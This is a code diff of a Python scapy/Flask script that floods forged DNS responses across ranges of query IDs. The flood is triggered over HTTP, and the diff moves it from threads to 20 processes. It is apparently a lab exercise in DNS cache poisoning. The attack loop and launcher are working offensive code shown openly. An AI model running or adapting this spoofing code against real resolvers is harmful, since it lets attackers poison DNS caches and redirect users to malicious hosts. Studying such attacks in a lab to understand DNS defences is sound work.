@@ -1,6 +1,6 @@
 from scapy.all import *
+import multiprocessing as mp
 from flask import Flask, request
-import threading
 
 app = Flask(__name__)
 src_ip = "192.168.0.100"
@@ -26,20 +26,26 @@ s = conf.L3socket()
 
 
 def attack(start):
-	for i in range(start, start + 500, 1):
-		dns_layer.id = i % 65000
-		s.send(response)
+  for i in range(start, start + 500, 1):
+    dns_layer.id = i
+    s.send(response)
+  print("Finished")
 
 
 @app.route('/', methods=['GET'])
 def start_attack():
-	qid = int(request.args.get('start_qid'))
-	for i in range(0, 20, 1):
-		threading.Thread(target=attack, args=(qid,)).start()
-		qid += 500
+  qid = int(request.args.get('start_qid'))
+  start_time = time.time()
+  mp.set_start_method('spawn')
+  for i in range(0, 20, 1):
+    mp.Process(target=attack, args=(qid,)).start()
+    qid += 500
+
+  end_time = time.time()
+  
+  
+  return f"Packet from QID: {request.args.get('start_qid')} to QID: {qid} sended in {end_time-start_time}"
 
 
 if __name__ == "__main__":
-	mp.set_start_method('spawn')
-	app.run(debug = True, host = '0.0.0.0', port = 8888)
-
+  app.run(debug = True, host = '0.0.0.0', port = 42069)
